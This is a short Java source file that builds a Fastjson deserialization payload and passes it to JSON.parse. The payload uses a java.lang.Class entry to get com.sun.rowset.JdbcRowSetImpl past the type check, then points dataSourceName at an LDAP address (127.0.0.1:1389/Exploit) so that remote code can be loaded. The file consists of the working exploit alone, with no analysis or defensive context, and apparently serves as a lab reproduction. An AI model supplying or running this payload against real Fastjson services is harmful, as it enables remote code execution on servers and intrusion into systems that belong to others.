import com.alibaba.fastjson.JSON;

public class test{

    public static void main(String[] args) {
        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"xxxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
                "\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}}}";
        JSON.parse(payload);

    }
}